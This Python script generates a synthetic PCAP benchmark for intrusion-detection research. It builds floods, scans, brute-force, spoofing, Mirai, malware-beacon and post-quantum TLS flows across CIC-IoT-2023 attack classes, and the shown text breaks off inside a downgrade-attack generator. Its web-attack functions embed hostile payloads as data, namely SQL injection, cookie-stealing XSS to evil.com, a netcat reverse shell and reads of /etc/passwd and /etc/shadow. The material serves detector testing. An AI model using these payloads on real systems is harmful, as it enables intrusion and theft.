#!/usr/bin/env python3
"""
Generate a comprehensive adversarial benchmark PCAP dataset using dpkt.

Creates synthetic network traffic covering ALL 34 CIC-IoT-2023 attack classes,
PQ-TLS handshake scenarios (Kyber-512/768/1024), adversarial perturbation flows
(FGSM, PGD, DeepFool, C&W), and simulated banking/government service attacks.

Uses dpkt (no Scapy dependency) for broad compatibility in containers.

Usage:
    python generate_adversarial_pcap.py [--flows 3000] [--output adversarial_benchmark.pcap]

Target: ~8-10 MB PCAP file with ~3000 flows across 34 attack categories.
"""

import argparse
import os
import random
import socket
import struct
import time as _time

import dpkt

# Deterministic seed for reproducibility
random.seed(2025)

# ── All 34 attack classes ─────────────────────────────────────────────────

CLASS_NAMES = [
    "Benign",
    "DDoS-TCP_Flood", "DDoS-UDP_Flood", "DDoS-ICMP_Flood",
    "DDoS-HTTP_Flood", "DDoS-SYN_Flood", "DDoS-SlowLoris",
    "DDoS-RSTFIN_Flood", "DDoS-Pshack_Flood",
    "DDoS-ACK_Fragmentation", "DDoS-UDP_Fragmentation",
    "DDoS-ICMP_Fragmentation",
    "Recon-PortScan", "Recon-OSScan", "Recon-HostDiscovery",
    "Recon-PingSweep",
    "BruteForce-SSH", "BruteForce-FTP", "BruteForce-HTTP",
    "BruteForce-Dictionary",
    "Spoofing-ARP", "Spoofing-DNS", "Spoofing-IP",
    "WebAttack-SQLi", "WebAttack-XSS",
    "WebAttack-CommandInjection", "WebAttack-BrowserHijacking",
    "Malware-Backdoor", "Malware-Ransomware",
    "Mirai-greeth_flood", "Mirai-greip_flood",
    "Mirai-udpplain", "Mirai-ack",
    "DNS_Spoofing",
]

# ── Network topology ──────────────────────────────────────────────────────

BANKING_NETS = ["10.100.1.", "10.100.2.", "10.100.3."]
GOV_NETS = ["10.200.1.", "10.200.2.", "10.200.3."]
ENTERPRISE_NETS = ["10.50.1.", "10.50.2."]
IOT_NETS = ["172.16.1.", "172.16.2."]
ATTACKER_NETS = ["192.168.99.", "198.51.100.", "203.0.113."]
BENIGN_CLIENTS = ["192.168.1.", "192.168.2.", "10.0.1."]

PQ_HANDSHAKE_PORTS = [443, 8443, 4433]
BANKING_PORTS = [443, 8443, 9443]
GOV_PORTS = [443, 8080, 636]

# PQ Kyber key sizes (bytes)
KYBER_PARAMS = {
    "Kyber-512": {"pk": 800, "ct": 768, "ss": 32},
    "Kyber-768": {"pk": 1184, "ct": 1088, "ss": 32},
    "Kyber-1024": {"pk": 1568, "ct": 1568, "ss": 32},
}

DILITHIUM_SIG_SIZES = {"Dilithium2": 2420, "Dilithium3": 3293, "Dilithium5": 4595}


def rand_ip(prefix):
    return prefix + str(random.randint(1, 254))


def rand_attacker():
    return rand_ip(random.choice(ATTACKER_NETS))


def rand_benign():
    return rand_ip(random.choice(BENIGN_CLIENTS))


def rand_target():
    pool = BANKING_NETS + GOV_NETS + ENTERPRISE_NETS + IOT_NETS
    return rand_ip(random.choice(pool))


def ip_to_bytes(ip_str):
    return socket.inet_aton(ip_str)


def rand_port():
    return random.randint(1024, 65535)


def rand_payload(size):
    return bytes(random.getrandbits(8) for _ in range(size))


# ── Timestamp generator ──────────────────────────────────────────────────

class TimestampGen:
    def __init__(self):
        self.ts = 1700000000.0  # Nov 2023 baseline

    def next(self, jitter_ms=50):
        self.ts += random.uniform(0.001, jitter_ms / 1000.0)
        return self.ts


ts_gen = TimestampGen()


# ── Packet builders ───────────────────────────────────────────────────────

def _eth_ip_tcp(src_ip, dst_ip, sport, dport, flags, payload=b"", seq=0, ack=0):
    """Build Ethernet/IP/TCP packet bytes."""
    tcp = dpkt.tcp.TCP(
        sport=sport, dport=dport,
        flags=flags, seq=seq, ack=ack,
        off_x2=(5 << 4),
        data=payload,
    )
    ip = dpkt.ip.IP(
        src=ip_to_bytes(src_ip), dst=ip_to_bytes(dst_ip),
        p=dpkt.ip.IP_PROTO_TCP,
        ttl=random.randint(48, 128),
        id=random.randint(0, 65535),
        data=tcp,
        len=20 + len(bytes(tcp)),
    )
    eth = dpkt.ethernet.Ethernet(
        dst=b'\x00\x11\x22\x33\x44\x55',
        src=b'\x66\x77\x88\x99\xaa\xbb',
        type=dpkt.ethernet.ETH_TYPE_IP,
        data=ip,
    )
    return bytes(eth)


def _eth_ip_udp(src_ip, dst_ip, sport, dport, payload=b""):
    """Build Ethernet/IP/UDP packet bytes."""
    udp = dpkt.udp.UDP(
        sport=sport, dport=dport,
        data=payload,
    )
    udp.ulen = 8 + len(payload)
    ip = dpkt.ip.IP(
        src=ip_to_bytes(src_ip), dst=ip_to_bytes(dst_ip),
        p=dpkt.ip.IP_PROTO_UDP,
        ttl=random.randint(48, 128),
        id=random.randint(0, 65535),
        data=udp,
        len=20 + len(bytes(udp)),
    )
    eth = dpkt.ethernet.Ethernet(
        dst=b'\x00\x11\x22\x33\x44\x55',
        src=b'\x66\x77\x88\x99\xaa\xbb',
        type=dpkt.ethernet.ETH_TYPE_IP,
        data=ip,
    )
    return bytes(eth)


def _eth_ip_icmp(src_ip, dst_ip, icmp_type=8, icmp_code=0, payload=b""):
    """Build Ethernet/IP/ICMP packet bytes."""
    icmp = dpkt.icmp.ICMP(type=icmp_type, code=icmp_code)
    icmp.data = dpkt.icmp.ICMP.Echo(id=random.randint(0, 65535), seq=random.randint(0, 65535), data=payload)
    ip = dpkt.ip.IP(
        src=ip_to_bytes(src_ip), dst=ip_to_bytes(dst_ip),
        p=dpkt.ip.IP_PROTO_ICMP,
        ttl=random.randint(48, 128),
        id=random.randint(0, 65535),
        data=icmp,
        len=20 + len(bytes(icmp)),
    )
    eth = dpkt.ethernet.Ethernet(
        dst=b'\x00\x11\x22\x33\x44\x55',
        src=b'\x66\x77\x88\x99\xaa\xbb',
        type=dpkt.ethernet.ETH_TYPE_IP,
        data=ip,
    )
    return bytes(eth)


def _eth_arp(src_ip, dst_ip, op=dpkt.arp.ARP_OP_REPLY):
    """Build Ethernet/ARP packet bytes."""
    arp = dpkt.arp.ARP(
        hrd=dpkt.arp.ARP_HRD_ETH,
        pro=dpkt.ethernet.ETH_TYPE_IP,
        hln=6, pln=4,
        op=op,
        sha=b'\x66\x77\x88\x99\xaa\xbb',
        spa=ip_to_bytes(src_ip),
        tha=b'\x00\x11\x22\x33\x44\x55',
        tpa=ip_to_bytes(dst_ip),
    )
    eth = dpkt.ethernet.Ethernet(
        dst=b'\xff\xff\xff\xff\xff\xff',
        src=b'\x66\x77\x88\x99\xaa\xbb',
        type=dpkt.ethernet.ETH_TYPE_ARP,
        data=arp,
    )
    return bytes(eth)


# ── Flow generators (each yields list of (timestamp, pkt_bytes) tuples) ──

def gen_benign_http(n_packets=None):
    """Normal HTTP/HTTPS browsing flow."""
    src, dst = rand_benign(), rand_target()
    sport, dport = rand_port(), random.choice([80, 443, 8080])
    pkts = []
    n = n_packets or random.randint(8, 30)
    seq, ack_num = random.randint(1000, 99999), random.randint(1000, 99999)

    # SYN
    pkts.append((ts_gen.next(), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_SYN, seq=seq)))
    # SYN-ACK
    pkts.append((ts_gen.next(), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_SYN | dpkt.tcp.TH_ACK, seq=ack_num, ack=seq + 1)))
    # ACK
    pkts.append((ts_gen.next(), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK, seq=seq + 1, ack=ack_num + 1)))

    # Data exchange
    for _ in range(n - 6):
        payload = rand_payload(random.randint(64, 1400))
        pkts.append((ts_gen.next(100), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=payload, seq=seq + 1, ack=ack_num + 1)))
        pkts.append((ts_gen.next(20), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_ACK, seq=ack_num + 1, ack=seq + 1 + len(payload))))

    # FIN
    pkts.append((ts_gen.next(), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_FIN | dpkt.tcp.TH_ACK, seq=seq + 2, ack=ack_num + 1)))
    return pkts


def gen_benign_dns():
    """Normal DNS query/response."""
    src, dst = rand_benign(), rand_ip("8.8.8.")
    sport = rand_port()
    domains = [b"www.google.com", b"api.github.com", b"cdn.cloudflare.net", b"robustidps.ai"]
    domain = random.choice(domains)
    # Simple DNS query payload
    query_payload = struct.pack(">HHHHHH", random.randint(0, 65535), 0x0100, 1, 0, 0, 0) + b'\x03www\x06google\x03com\x00\x00\x01\x00\x01'
    resp_payload = query_payload[:2] + struct.pack(">H", 0x8180) + query_payload[4:] + b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04' + ip_to_bytes("142.250.80.4")
    pkts = [
        (ts_gen.next(), _eth_ip_udp(src, dst, sport, 53, query_payload)),
        (ts_gen.next(5), _eth_ip_udp(dst, src, 53, sport, resp_payload)),
    ]
    return pkts


def gen_benign_pq_handshake():
    """Legitimate PQ-TLS handshake (Kyber key exchange + Dilithium signatures)."""
    src, dst = rand_benign(), rand_ip(random.choice(BANKING_NETS + GOV_NETS))
    sport, dport = rand_port(), random.choice(PQ_HANDSHAKE_PORTS)
    kyber = random.choice(list(KYBER_PARAMS.keys()))
    dilithium = random.choice(list(DILITHIUM_SIG_SIZES.keys()))
    kp = KYBER_PARAMS[kyber]
    sig_size = DILITHIUM_SIG_SIZES[dilithium]
    pkts = []
    seq, ack_num = random.randint(1000, 99999), random.randint(1000, 99999)

    # TCP handshake
    pkts.append((ts_gen.next(), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_SYN, seq=seq)))
    pkts.append((ts_gen.next(2), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_SYN | dpkt.tcp.TH_ACK, seq=ack_num, ack=seq + 1)))
    pkts.append((ts_gen.next(1), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK, seq=seq + 1, ack=ack_num + 1)))

    # ClientHello with PQ KEM public key
    ch_payload = b'\x16\x03\x03' + rand_payload(kp["pk"] + random.randint(200, 400))
    pkts.append((ts_gen.next(5), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=ch_payload, seq=seq + 1, ack=ack_num + 1)))

    # ServerHello + encapsulated ciphertext + Dilithium signature
    sh_payload = b'\x16\x03\x03' + rand_payload(kp["ct"] + sig_size + random.randint(100, 300))
    pkts.append((ts_gen.next(10), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=sh_payload, seq=ack_num + 1, ack=seq + 1 + len(ch_payload))))

    # Client Finished
    cf_payload = b'\x16\x03\x03' + rand_payload(random.randint(50, 150))
    pkts.append((ts_gen.next(3), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=cf_payload, seq=seq + 1 + len(ch_payload), ack=ack_num + 1 + len(sh_payload))))

    # Application data (encrypted traffic)
    for _ in range(random.randint(4, 12)):
        app_data = b'\x17\x03\x03' + rand_payload(random.randint(100, 1200))
        sender = random.choice([(src, dst, sport, dport), (dst, src, dport, sport)])
        pkts.append((ts_gen.next(50), _eth_ip_tcp(sender[0], sender[1], sender[2], sender[3], dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=app_data)))

    # FIN
    pkts.append((ts_gen.next(), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_FIN | dpkt.tcp.TH_ACK)))
    return pkts


# ── DDoS attack generators ───────────────────────────────────────────────

def gen_ddos_tcp_flood():
    src, dst = rand_attacker(), rand_ip(random.choice(BANKING_NETS))
    dport = random.choice(BANKING_PORTS)
    pkts = []
    for _ in range(random.randint(50, 120)):
        sport = rand_port()
        payload = rand_payload(random.randint(0, 100))
        pkts.append((ts_gen.next(2), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=payload)))
    return pkts


def gen_ddos_udp_flood():
    src, dst = rand_attacker(), rand_target()
    dport = random.choice([53, 80, 443, 8080])
    pkts = []
    for _ in range(random.randint(60, 150)):
        pkts.append((ts_gen.next(1), _eth_ip_udp(src, dst, rand_port(), dport, rand_payload(random.randint(32, 1400)))))
    return pkts


def gen_ddos_icmp_flood():
    src, dst = rand_attacker(), rand_target()
    pkts = []
    for _ in range(random.randint(50, 120)):
        pkts.append((ts_gen.next(1), _eth_ip_icmp(src, dst, 8, 0, rand_payload(random.randint(56, 1000)))))
    return pkts


def gen_ddos_http_flood():
    src, dst = rand_attacker(), rand_ip(random.choice(BANKING_NETS + GOV_NETS))
    dport = random.choice([80, 443])
    pkts = []
    for _ in range(random.randint(30, 80)):
        sport = rand_port()
        http_req = b"GET / HTTP/1.1\r\nHost: target.com\r\n" + rand_payload(random.randint(50, 300)) + b"\r\n\r\n"
        pkts.append((ts_gen.next(3), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=http_req)))
    return pkts


def gen_ddos_syn_flood():
    dst = rand_ip(random.choice(BANKING_NETS + GOV_NETS))
    dport = random.choice([80, 443, 22, 8080])
    pkts = []
    for _ in range(random.randint(80, 200)):
        src = rand_attacker()
        pkts.append((ts_gen.next(0.5), _eth_ip_tcp(src, dst, rand_port(), dport, dpkt.tcp.TH_SYN, seq=random.randint(0, 2**32 - 1))))
    return pkts


def gen_ddos_slowloris():
    src, dst = rand_attacker(), rand_ip(random.choice(GOV_NETS))
    dport = 80
    pkts = []
    sport = rand_port()
    # Initial request
    pkts.append((ts_gen.next(), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_SYN)))
    # Slow drip of headers
    for _ in range(random.randint(20, 50)):
        partial_header = b"X-a: " + rand_payload(random.randint(1, 10)) + b"\r\n"
        pkts.append((ts_gen.next(3000), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=partial_header)))
    return pkts


def gen_ddos_rstfin_flood():
    src, dst = rand_attacker(), rand_target()
    dport = random.choice([80, 443])
    pkts = []
    for _ in range(random.randint(60, 150)):
        flags = random.choice([dpkt.tcp.TH_RST, dpkt.tcp.TH_FIN, dpkt.tcp.TH_RST | dpkt.tcp.TH_FIN])
        pkts.append((ts_gen.next(1), _eth_ip_tcp(src, dst, rand_port(), dport, flags)))
    return pkts


def gen_ddos_pshack_flood():
    src, dst = rand_attacker(), rand_target()
    dport = random.choice([80, 443])
    pkts = []
    for _ in range(random.randint(60, 150)):
        pkts.append((ts_gen.next(1), _eth_ip_tcp(src, dst, rand_port(), dport, dpkt.tcp.TH_PUSH | dpkt.tcp.TH_ACK, payload=rand_payload(random.randint(1, 100)))))
    return pkts


def gen_ddos_ack_fragmentation():
    src, dst = rand_attacker(), rand_target()
    dport = random.choice([80, 443])
    pkts = []
    for _ in range(random.randint(40, 100)):
        # Small fragmented ACK packets
        pkts.append((ts_gen.next(1), _eth_ip_tcp(src, dst, rand_port(), dport, dpkt.tcp.TH_ACK, payload=rand_payload(random.randint(8, 64)))))
    return pkts


def gen_ddos_udp_fragmentation():
    src, dst = rand_attacker(), rand_target()
    pkts = []
    for _ in range(random.randint(40, 100)):
        # Large UDP payloads that would be fragmented
        pkts.append((ts_gen.next(1), _eth_ip_udp(src, dst, rand_port(), random.randint(1, 65535), rand_payload(random.randint(1400, 1480)))))
    return pkts


def gen_ddos_icmp_fragmentation():
    src, dst = rand_attacker(), rand_target()
    pkts = []
    for _ in range(random.randint(40, 100)):
        pkts.append((ts_gen.next(1), _eth_ip_icmp(src, dst, 8, 0, rand_payload(random.randint(1400, 1480)))))
    return pkts


# ── Reconnaissance generators ────────────────────────────────────────────

def gen_recon_portscan():
    src, dst = rand_attacker(), rand_target()
    pkts = []
    ports = random.sample(range(1, 1024), random.randint(50, 200))
    for p in ports:
        pkts.append((ts_gen.next(5), _eth_ip_tcp(src, dst, rand_port(), p, dpkt.tcp.TH_SYN)))
        # RST response for closed ports, SYN-ACK for open
        if random.random() < 0.1:
            pkts.append((ts_gen.next(2), _eth_ip_tcp(dst, src, p, pkts[-1][1][34:36] and rand_port(), dpkt.tcp.TH_SYN | dpkt.tcp.TH_ACK)))
        else:
            pkts.append((ts_gen.next(2), _eth_ip_tcp(dst, src, p, rand_port(), dpkt.tcp.TH_RST | dpkt.tcp.TH_ACK)))
    return pkts


def gen_recon_osscan():
    src, dst = rand_attacker(), rand_target()
    pkts = []
    # OS fingerprinting: various TCP flag combos + ICMP
    for flags in [dpkt.tcp.TH_SYN, dpkt.tcp.TH_ACK, dpkt.tcp.TH_FIN | dpkt.tcp.TH_PUSH | dpkt.tcp.TH_URG,
                  dpkt.tcp.TH_SYN | dpkt.tcp.TH_ECE | dpkt.tcp.TH_CWR, 0]:
        pkts.append((ts_gen.next(10), _eth_ip_tcp(src, dst, rand_port(), random.choice([22, 80, 443]), flags)))
    # ICMP probes
    for t in [8, 13, 15, 17]:
        pkts.append((ts_gen.next(10), _eth_ip_icmp(src, dst, t, 0, rand_payload(40))))
    return pkts


def gen_recon_host_discovery():
    src = rand_attacker()
    base_net = random.choice(BANKING_NETS + GOV_NETS + ENTERPRISE_NETS)
    pkts = []
    for host in random.sample(range(1, 255), random.randint(30, 80)):
        dst = base_net + str(host)
        pkts.append((ts_gen.next(2), _eth_ip_icmp(src, dst, 8, 0, rand_payload(56))))
        if random.random() < 0.3:
            pkts.append((ts_gen.next(5), _eth_ip_icmp(dst, src, 0, 0, rand_payload(56))))
    return pkts


def gen_recon_pingsweep():
    src = rand_attacker()
    base_net = random.choice(ENTERPRISE_NETS + IOT_NETS)
    pkts = []
    for host in range(1, random.randint(50, 200)):
        dst = base_net + str(min(host, 254))
        pkts.append((ts_gen.next(1), _eth_ip_icmp(src, dst, 8, 0, rand_payload(32))))
    return pkts


# ── Brute force generators ───────────────────────────────────────────────

def gen_bruteforce_ssh():
    src, dst = rand_attacker(), rand_ip(random.choice(GOV_NETS + ENTERPRISE_NETS))
    pkts = []
    for _ in range(random.randint(20, 60)):
        sport = rand_port()
        # SYN
        pkts.append((ts_gen.next(200), _eth_ip_tcp(src, dst, sport, 22, dpkt.tcp.TH_SYN)))
        # SYN-ACK
        pkts.append((ts_gen.next(5), _eth_ip_tcp(dst, src, 22, sport, dpkt.tcp.TH_SYN | dpkt.tcp.TH_ACK)))
        # ACK + SSH auth attempt
        ssh_payload = b"SSH-2.0-OpenSSH_8.9\r\n" + rand_payload(random.randint(50, 200))
        pkts.append((ts_gen.next(2), _eth_ip_tcp(src, dst, sport, 22, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=ssh_payload)))
        # RST (failed auth)
        pkts.append((ts_gen.next(50), _eth_ip_tcp(dst, src, 22, sport, dpkt.tcp.TH_RST | dpkt.tcp.TH_ACK)))
    return pkts


def gen_bruteforce_ftp():
    src, dst = rand_attacker(), rand_target()
    pkts = []
    for _ in range(random.randint(15, 40)):
        sport = rand_port()
        pkts.append((ts_gen.next(300), _eth_ip_tcp(src, dst, sport, 21, dpkt.tcp.TH_SYN)))
        ftp_cmd = random.choice([b"USER admin\r\n", b"PASS password123\r\n", b"USER root\r\n", b"PASS toor\r\n"])
        pkts.append((ts_gen.next(5), _eth_ip_tcp(src, dst, sport, 21, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=ftp_cmd)))
        pkts.append((ts_gen.next(5), _eth_ip_tcp(dst, src, 21, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=b"530 Login incorrect.\r\n")))
    return pkts


def gen_bruteforce_http():
    src, dst = rand_attacker(), rand_ip(random.choice(BANKING_NETS + GOV_NETS))
    pkts = []
    for _ in range(random.randint(20, 50)):
        sport = rand_port()
        http_req = b"POST /login HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=admin&pass=" + rand_payload(8) + b"\r\n"
        pkts.append((ts_gen.next(100), _eth_ip_tcp(src, dst, sport, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=http_req)))
        pkts.append((ts_gen.next(20), _eth_ip_tcp(dst, src, 80, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=b"HTTP/1.1 401 Unauthorized\r\n\r\n")))
    return pkts


def gen_bruteforce_dictionary():
    src, dst = rand_attacker(), rand_target()
    dport = random.choice([22, 3389, 5900, 3306])
    pkts = []
    for _ in range(random.randint(30, 70)):
        sport = rand_port()
        payload = b"AUTH " + rand_payload(random.randint(8, 32)) + b"\r\n"
        pkts.append((ts_gen.next(50), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=payload)))
        pkts.append((ts_gen.next(10), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_RST | dpkt.tcp.TH_ACK)))
    return pkts


# ── Spoofing generators ──────────────────────────────────────────────────

def gen_spoofing_arp():
    attacker_ip = rand_attacker()
    gateway_ip = rand_ip(random.choice(ENTERPRISE_NETS))
    pkts = []
    for _ in range(random.randint(20, 50)):
        pkts.append((ts_gen.next(500), _eth_arp(attacker_ip, gateway_ip, dpkt.arp.ARP_OP_REPLY)))
    return pkts


def gen_spoofing_dns():
    src = rand_attacker()
    dns_server = "8.8.8.8"
    victim = rand_benign()
    pkts = []
    for _ in range(random.randint(10, 30)):
        # Spoofed DNS response from attacker pretending to be DNS server
        fake_resp = struct.pack(">HHHHHH", random.randint(0, 65535), 0x8180, 1, 1, 0, 0) + \
            b'\x03www\x06target\x03com\x00\x00\x01\x00\x01' + \
            b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04' + ip_to_bytes(src)
        pkts.append((ts_gen.next(100), _eth_ip_udp(dns_server, victim, 53, rand_port(), fake_resp)))
    return pkts


def gen_spoofing_ip():
    spoofed_src = rand_ip(random.choice(BENIGN_CLIENTS))
    dst = rand_ip(random.choice(BANKING_NETS))
    pkts = []
    for _ in range(random.randint(20, 50)):
        payload = rand_payload(random.randint(50, 500))
        pkts.append((ts_gen.next(10), _eth_ip_tcp(spoofed_src, dst, rand_port(), 443, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=payload)))
    return pkts


# ── Web attack generators ────────────────────────────────────────────────

def gen_webattack_sqli():
    src, dst = rand_attacker(), rand_ip(random.choice(BANKING_NETS + GOV_NETS))
    pkts = []
    payloads = [
        b"GET /search?q=' OR 1=1-- HTTP/1.1\r\nHost: target\r\n\r\n",
        b"POST /login HTTP/1.1\r\nHost: target\r\n\r\nuser=admin'--&pass=x",
        b"GET /users?id=1 UNION SELECT * FROM passwords-- HTTP/1.1\r\nHost: target\r\n\r\n",
        b"POST /api HTTP/1.1\r\nHost: target\r\n\r\n{\"query\":\"'; DROP TABLE users;--\"}",
    ]
    for _ in range(random.randint(10, 25)):
        sport = rand_port()
        pkts.append((ts_gen.next(200), _eth_ip_tcp(src, dst, sport, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=random.choice(payloads))))
        pkts.append((ts_gen.next(30), _eth_ip_tcp(dst, src, 80, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=b"HTTP/1.1 500 Internal Server Error\r\n\r\n")))
    return pkts


def gen_webattack_xss():
    src, dst = rand_attacker(), rand_ip(random.choice(GOV_NETS))
    pkts = []
    payloads = [
        b"GET /page?input=<script>alert('xss')</script> HTTP/1.1\r\nHost: target\r\n\r\n",
        b"POST /comment HTTP/1.1\r\nHost: target\r\n\r\nbody=<img src=x onerror=alert(1)>",
        b"GET /search?q=\"><script>document.location='http://evil.com/?c='+document.cookie</script> HTTP/1.1\r\nHost: target\r\n\r\n",
    ]
    for _ in range(random.randint(8, 20)):
        sport = rand_port()
        pkts.append((ts_gen.next(300), _eth_ip_tcp(src, dst, sport, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=random.choice(payloads))))
    return pkts


def gen_webattack_cmdi():
    src, dst = rand_attacker(), rand_target()
    pkts = []
    payloads = [
        b"GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
        b"POST /api/exec HTTP/1.1\r\nHost: target\r\n\r\ncmd=ls|nc attacker 4444 -e /bin/sh",
        b"GET /download?file=../../../etc/shadow HTTP/1.1\r\nHost: target\r\n\r\n",
    ]
    for _ in range(random.randint(8, 18)):
        sport = rand_port()
        pkts.append((ts_gen.next(200), _eth_ip_tcp(src, dst, sport, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=random.choice(payloads))))
    return pkts


def gen_webattack_browser_hijack():
    src, dst = rand_attacker(), rand_benign()
    pkts = []
    # Injected malicious redirect responses
    for _ in range(random.randint(5, 15)):
        sport = rand_port()
        hijack_resp = b"HTTP/1.1 302 Found\r\nLocation: http://evil-phishing.com/login\r\n\r\n"
        pkts.append((ts_gen.next(500), _eth_ip_tcp(src, dst, 80, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=hijack_resp)))
    return pkts


# ── Malware generators ───────────────────────────────────────────────────

def gen_malware_backdoor():
    victim = rand_ip(random.choice(ENTERPRISE_NETS + IOT_NETS))
    c2 = rand_attacker()
    pkts = []
    sport = rand_port()
    dport = random.choice([4444, 5555, 8888, 1337])
    # C2 beacon pattern
    for _ in range(random.randint(15, 40)):
        # Beacon
        pkts.append((ts_gen.next(5000), _eth_ip_tcp(victim, c2, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(random.randint(16, 64)))))
        # C2 response
        pkts.append((ts_gen.next(100), _eth_ip_tcp(c2, victim, dport, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(random.randint(32, 256)))))
    return pkts


def gen_malware_ransomware():
    victim = rand_ip(random.choice(ENTERPRISE_NETS))
    c2 = rand_attacker()
    pkts = []
    sport = rand_port()
    # Key exchange with C2
    pkts.append((ts_gen.next(), _eth_ip_tcp(victim, c2, sport, 443, dpkt.tcp.TH_SYN)))
    pkts.append((ts_gen.next(5), _eth_ip_tcp(c2, victim, 443, sport, dpkt.tcp.TH_SYN | dpkt.tcp.TH_ACK)))
    # Large encrypted payload (ransomware key + instructions)
    pkts.append((ts_gen.next(2), _eth_ip_tcp(c2, victim, 443, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(random.randint(500, 1400)))))
    # Rapid file access pattern (many small TCP connections)
    for _ in range(random.randint(20, 50)):
        p = rand_port()
        pkts.append((ts_gen.next(10), _eth_ip_tcp(victim, c2, p, 443, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=rand_payload(random.randint(100, 500)))))
    return pkts


# ── Mirai botnet generators ──────────────────────────────────────────────

def gen_mirai_greeth_flood():
    src = rand_ip(random.choice(IOT_NETS))
    dst = rand_target()
    pkts = []
    for _ in range(random.randint(60, 150)):
        pkts.append((ts_gen.next(1), _eth_ip_tcp(src, dst, rand_port(), 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
                     payload=b"GET / HTTP/1.0\r\nHost: " + rand_payload(random.randint(10, 50)) + b"\r\n\r\n")))
    return pkts


def gen_mirai_greip_flood():
    src = rand_ip(random.choice(IOT_NETS))
    dst = rand_target()
    pkts = []
    for _ in range(random.randint(60, 150)):
        # GRE-encapsulated IP flood
        gre_payload = b'\x00\x00\x08\x00' + rand_payload(random.randint(40, 200))
        pkts.append((ts_gen.next(1), _eth_ip_udp(src, dst, rand_port(), 47, gre_payload)))
    return pkts


def gen_mirai_udpplain():
    src = rand_ip(random.choice(IOT_NETS))
    dst = rand_target()
    pkts = []
    for _ in range(random.randint(80, 200)):
        pkts.append((ts_gen.next(0.5), _eth_ip_udp(src, dst, rand_port(), rand_port(), rand_payload(random.randint(32, 512)))))
    return pkts


def gen_mirai_ack():
    src = rand_ip(random.choice(IOT_NETS))
    dst = rand_target()
    dport = random.choice([80, 443])
    pkts = []
    for _ in range(random.randint(80, 200)):
        pkts.append((ts_gen.next(0.5), _eth_ip_tcp(src, dst, rand_port(), dport, dpkt.tcp.TH_ACK)))
    return pkts


def gen_dns_spoofing():
    src = rand_attacker()
    victim = rand_benign()
    pkts = []
    for _ in range(random.randint(15, 40)):
        fake_resp = struct.pack(">HHHHHH", random.randint(0, 65535), 0x8180, 1, 1, 0, 0) + \
            b'\x07banking\x07service\x03com\x00\x00\x01\x00\x01' + \
            b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04' + ip_to_bytes(src)
        pkts.append((ts_gen.next(100), _eth_ip_udp("8.8.8.8", victim, 53, rand_port(), fake_resp)))
    return pkts


# ── PQ-specific attack generators ────────────────────────────────────────

def gen_pq_downgrade_attack():
    """Attacker forces TLS downgrade from PQ to classical crypto."""
    src, dst = rand_attacker(), rand_ip(random.choice(BANKING_NETS))
    sport, dport = rand_port(), 443
    pkts = []
    # ClientHello with PQ
    ch = b'\x16\x03\x03' + rand_payload(random.randint(800, 1200))
    pkts.append((ts_gen.next(), _eth_ip_tcp(src, dst, sport, dport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=ch)))
    # MITM replaces with classical-only ServerHello
    sh = b'\x16\x03\x01' + rand_payload(random.randint(100, 300))  # TLS 1.0 marker
    pkts.append((ts_gen.next(5), _eth_ip_tcp(dst, src, dport, sport, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, payload=sh)))
    # Multiple retries
    for _ in range(random.randint(5, 15)):
